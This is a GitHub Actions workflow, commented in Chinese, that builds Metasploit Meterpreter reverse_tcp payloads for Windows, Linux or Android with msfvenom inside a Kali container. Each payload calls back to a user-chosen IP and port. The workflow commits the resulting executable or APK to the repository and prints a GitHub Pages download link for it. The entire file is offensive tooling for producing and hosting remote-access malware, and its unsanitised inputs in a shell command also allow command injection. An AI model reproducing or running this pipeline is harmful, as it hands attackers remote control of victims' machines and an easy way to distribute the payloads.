name: Generate Metasploit Payload

on:
  workflow_dispatch:
    inputs:
      platform:
        description: '选择目标平台'
        required: true
        default: 'windows'
        type: choice
        options:
          - windows
          - linux
          - android
      lhost:
        description: '输入你的公网IP或内网IP'
        required: true
        default: '192.168.1.100'
      lport:
        description: '输入监听端口'
        required: true
        default: '4444'

      

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code to specific directory
        uses: actions/checkout@v6  # 推荐使用具体版本号，如 v4 或 v5
        with:
          path: gitdir
      - name: Generate Payload using Kali Docker
        run: |
          # 拉取 Kali 镜像
          docker pull kalilinux/kali-rolling
          
          # 根据用户选择的平台，设置 msfvenom 参数
          case "${{ github.event.inputs.platform }}" in
            "windows")
              PAYLOAD="windows/x64/meterpreter/reverse_tcp"
              EXT="exe"
              FORMAT_FLAG="-f exe"
              PLATFORM="" # 留空，windows不需要额外平台参数
              ;;
            "android")
              PAYLOAD="android/meterpreter/reverse_tcp"
              EXT="apk"
              FORMAT_FLAG="" # apk格式不需要-f参数
              PLATFORM="--platform android"
              ;;
            "linux")
              PAYLOAD="linux/x64/meterpreter/reverse_tcp"
              EXT="elf"
              FORMAT_FLAG="-f elf"
              PLATFORM=""
              ;;
            *)
              echo "不支持的平台"
              exit 1
              ;;
          esac

          # 生成文件名并保存到环境变量（在容器外部执行）
          ENAME=$(cat /proc/sys/kernel/random/uuid)
          echo "FILENAME=$ENAME" >> $GITHUB_ENV
          echo "EXT=$EXT" >> $GITHUB_ENV
          OUTPUT_FILE="/output/${ENAME}.${EXT}"

          echo "正在生成载荷: $PAYLOAD"
          echo "输出文件: $OUTPUT_FILE"

          # 运行容器并生成 Payload
          docker run --rm \
            -v "${PWD}:/output" \
            -u root \
            kalilinux/kali-rolling \
            bash -c "apt-get update && \
                     apt-get install -y metasploit-framework && \
                     msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
          for file in *.${EXT}; do
              # 确保是文件（防止没有匹配到文件时出错）
              if [[ -f "$file" ]]; then
                  # --- 提取文件名核心部分（去掉.txt后缀）---
                  # 例如：abcd1.txt -> abcd1
                  filename="${file%.txt}"
                
                  # --- 字符串切片 ---
                  # 一级目录：从第0个字符开始，取2个字符 (第1-2位)
                  # 二级目录：从第2个字符开始，取2个字符 (第3-4位)
                  dir1="${filename:0:2}"
                  dir2="${filename:2:2}" # 注意：起始位置是2，长度是2
                  echo "DIR1=$dir1" >> $GITHUB_ENV
                  echo "DIR2=$dir2">>$GITHUB_ENV
                  # --- 创建目录并复制文件 ---
                  # mkdir -p 会自动创建父目录
                  mkdir -p "gitdir/dldir/$dir1/$dir2"
                
                  # 复制文件（-v 参数显示详细过程）
                  cp -v "$file" "gitdir/dldir/$dir1/$dir2/"
              fi
          done
          cd gitdir
          git add .
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"
          git commit -m "test"
          git push
      - name: Print download link
        run: echo "https://${{ github.repository_owner }}.github.io/${{ github.event.repository.name }}/dldir/${{ env.DIR1 }}/${{ env.DIR2 }}/${{ env.FILENAME }}.${{ env.EXT }}"
      - name: Upload Payload
        uses: actions/upload-artifact@v4
        with:
          name: Generated-Payload
          # 拼接路径和文件名
          path: ${{ env.FILENAME }}.${{ env.EXT }}